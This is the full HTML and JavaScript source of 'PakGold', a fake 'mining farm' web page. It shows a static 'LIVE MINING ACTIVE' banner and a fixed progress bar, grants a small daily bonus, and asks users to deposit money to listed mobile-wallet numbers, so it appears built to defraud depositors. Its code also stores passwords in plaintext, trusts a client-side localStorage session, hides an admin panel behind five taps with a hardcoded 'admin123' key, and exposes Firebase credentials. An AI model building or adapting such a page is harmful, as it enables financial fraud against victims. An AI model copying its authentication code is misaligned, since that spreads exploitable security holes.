<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PakGold | Professional Mining Farm</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #fbbf24; --bg: #020617; --glass: rgba(255, 255, 255, 0.03); --green: #10b981; --red: #ef4444; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
        body { background: var(--bg); color: white; min-height: 100vh; overflow-x: hidden; }
        
        /* Glassmorphism UI Components */
        .glass-card { background: var(--glass); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); border-radius: 28px; padding: 22px; width: 92%; max-width: 450px; margin: 15px auto; transition: 0.4s; }
        .btn-main { width: 100%; padding: 16px; background: var(--gold); border: none; border-radius: 16px; color: #000; font-weight: 700; cursor: pointer; text-transform: uppercase; transition: 0.3s; box-shadow: 0 4px 20px rgba(251, 191, 36, 0.15); }
        .btn-main:hover { transform: translateY(-2px); box-shadow: 0 6px 25px rgba(251, 191, 36, 0.25); }
        input, select { width: 100%; padding: 15px; background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.1); border-radius: 15px; color: white; margin-bottom: 12px; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--gold); background: rgba(255,255,255,0.07); }
        
        /* Layout Sections */
        #authSection, #dashboardPage, #loadingOverlay, #adminTrigger { display: none; }
        .active { display: block !important; }
        .flex-active { display: flex !important; }

        @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
        .mining-glow { animation: pulse 2s infinite; color: var(--gold); font-weight: bold; font-size: 0.7rem; }
    </style>
</head>
<body>

    <div id="loadingOverlay" style="position:fixed; inset:0; background:var(--bg); z-index:20000; display:none; flex-direction:column; align-items:center; justify-content:center;">
        <div style="width: 50px; height: 50px; border: 4px solid rgba(251,191,36,0.1); border-top: 4px solid var(--gold); border-radius: 50%; animation: spin 1s linear infinite;"></div>
        <p style="margin-top: 15px; font-size: 0.8rem; color: var(--gold); letter-spacing: 2px;">SYNCING DATABASE...</p>
    </div>

    <div id="authSection" class="active">
        <h1 id="secretTap" style="text-align:center; margin:60px 0; color:var(--gold); font-size: 3rem; font-weight: 600; cursor: default;">PakGold</h1>
        <div class="glass-card">
            <h2 id="authTitle" style="font-size:1.1rem; margin-bottom:25px; text-align: center; opacity: 0.8;">Secure Access</h2>
            <input type="text" id="username" placeholder="Username">
            <input type="password" id="password" placeholder="Password">
            <button id="authBtn" class="btn-main">Get Started 🚀</button>
            <p id="toggleAuth" style="text-align:center; font-size:0.8rem; margin-top:20px; cursor:pointer; color:#94a3b8;">New user? <span style="color:var(--gold)">Create Account</span></p>
            
            <div id="adminTrigger" style="margin-top: 25px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 20px;">
                <input type="password" id="adminKey" placeholder="Master Access Key">
                <button onclick="accessAdmin()" class="btn-main" style="background:var(--red); color:white;">Login Admin</button>
            </div>
        </div>
    </div>

    <div id="dashboardPage">
        <div class="glass-card" style="border-color:var(--gold); margin-top: 20px;">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 20px;">
                <div class="mining-glow">● LIVE MINING ACTIVE</div>
                <button onclick="logout()" style="background:rgba(239,68,68,0.1); border:none; color:var(--red); padding: 5px 12px; border-radius: 8px; font-size:0.6rem; font-weight:bold; cursor:pointer;">LOGOUT</button>
            </div>
            <div style="text-align:center; margin:25px 0;">
                <p style="font-size:0.65rem; color:#94a3b8; text-transform: uppercase; letter-spacing: 2px;">Your Earnings</p>
                <h1 style="color:white; font-size:3.2rem; margin: 10px 0;">PKR <span id="bal" style="color:var(--gold)">0.00</span></h1>
                <div style="font-size: 0.7rem; color: var(--green);">Ready for Withdrawal</div>
            </div>
            <div style="width:100%; height:8px; background:rgba(255,255,255,0.05); border-radius:10px; overflow:hidden;">
                <div id="miningProgress" style="width:0%; height:100%; background:linear-gradient(90deg, var(--gold), #fcd34d); box-shadow: 0 0 20px rgba(251, 191, 36, 0.4); transition: 1s;"></div>
            </div>
        </div>

        <div class="glass-card">
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                <button onclick="openPop('dep')" style="background:var(--glass); color:white; border:1px solid var(--gold); padding:16px; border-radius:18px; font-size:0.75rem; font-weight:bold;">DEPOSIT</button>
                <button onclick="openPop('wit')" style="background:var(--glass); color:white; border:1px solid var(--red); padding:16px; border-radius:18px; font-size:0.75rem; font-weight:bold;">WITHDRAW</button>
            </div>
            
            <div id="walletAction" style="display:none; margin-top: 25px; background: rgba(255,255,255,0.02); padding: 15px; border-radius: 20px;">
                <div id="depInfo" style="display:none; font-size: 0.75rem; line-height: 1.8; margin-bottom: 15px;">
                    <p><b>EasyPaisa:</b> <span style="color:var(--gold)">03379827882</span></p>
                    <p><b>JazzCash:</b> <span style="color:var(--gold)">03705519562</span></p>
                    <p><b>SadaPay:</b> <span style="color:var(--gold)">03705519562</span></p>
                </div>
                <input type="number" id="transAmount" placeholder="Amount (PKR)">
                <input type="text" id="transID" placeholder="TID / Account Number">
                <button id="transSubmit" class="btn-main" style="font-size: 0.8rem;">Submit Request</button>
            </div>
        </div>

        <div class="glass-card" style="border-color:#25d366; text-align: center;">
            <p style="font-size:0.7rem; color:#94a3b8; margin-bottom: 15px;">Contact: webhub262@gmail.com</p>
            <a href="YOUR_LINK" style="text-decoration:none;"><button class="btn-main" style="background:#25d366; color:white; padding: 12px;">Join Official WhatsApp</button></a>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
        import { getFirestore, doc, getDoc, setDoc, updateDoc, increment } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCMG6KG_oD8cjEk4YpbxXik-C5q8K5MDHk",
            authDomain: "dark-web-9.firebaseapp.com",
            projectId: "dark-web-9",
            storageBucket: "dark-web-9.firebasestorage.app",
            messagingSenderId: "564328425161",
            appId: "1:564328425161:web:eb109ab77356dafe7f4f18"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        
        let isLoginMode = true;
        const currentUser = localStorage.getItem('pakgold_user');

        // --- AUTH & TOGGLE ---
        document.getElementById('toggleAuth').onclick = () => {
            isLoginMode = !isLoginMode;
            document.getElementById('authTitle').innerText = isLoginMode ? "Secure Access" : "Join Mining Farm";
            document.getElementById('toggleAuth').innerHTML = isLoginMode ? 'New user? <span style="color:var(--gold)">Create Account</span>' : 'Already have an account? <span style="color:var(--gold)">Login</span>';
        };

        document.getElementById('authBtn').onclick = async () => {
            const user = document.getElementById('username').value.toLowerCase().trim();
            const pass = document.getElementById('password').value;
            if(!user || !pass) return alert("Fill all details");
            
            document.getElementById('loadingOverlay').style.display = 'flex';
            try {
                const userRef = doc(db, "users", user);
                const snap = await getDoc(userRef);
                if (isLoginMode) {
                    if (snap.exists() && snap.data().pass === pass) {
                        localStorage.setItem('pakgold_user', user);
                        location.reload();
                    } else { alert("Invalid Credentials!"); }
                } else {
                    if (snap.exists()) { alert("Username taken!"); }
                    else {
                        await setDoc(userRef, { user, pass, balance: 0, lastBonus: "" });
                        localStorage.setItem('pakgold_user', user);
                        location.reload();
                    }
                }
            } catch (e) { alert("Network Error! Check Firestore Rules."); }
            document.getElementById('loadingOverlay').style.display = 'none';
        };

        // --- DASHBOARD LOGIC ---
        if(currentUser) {
            document.getElementById('authSection').style.display = 'none';
            document.getElementById('dashboardPage').classList.add('active');
            
            const uRef = doc(db, "users", currentUser);
            getDoc(uRef).then(async (s) => {
                const data = s.data();
                document.getElementById('bal').innerText = data.balance.toFixed(2);
                
                // Automatic Daily Bonus Check
                const today = new Date().toDateString();
                if(data.lastBonus !== today) {
                    await updateDoc(uRef, { balance: increment(5), lastBonus: today });
                    alert("Sweetie! PKR 5 Daily Bonus Added 🎁");
                    location.reload();
                }
                
                // Progress Bar Animation
                document.getElementById('miningProgress').style.width = "75%";
            });
        }

        // --- WALLET UTILS ---
        window.openPop = (type) => {
            document.getElementById('walletAction').style.display = 'block';
            document.getElementById('depInfo').style.display = type === 'dep' ? 'block' : 'none';
            document.getElementById('transSubmit').innerText = type === 'dep' ? 'Submit Deposit' : 'Request Withdrawal';
        };

        // --- ADMIN BYPASS ---
        let clicks = 0;
        document.getElementById('secretTap').onclick = () => {
            clicks++;
            if(clicks === 5) document.getElementById('adminTrigger').style.display = 'block';
        };

        window.logout = () => { localStorage.removeItem('pakgold_user'); location.reload(); }
        window.accessAdmin = () => { if(document.getElementById('adminKey').value === "admin123") alert("God Mode Enabled"); }
    </script>
</body>
</html>
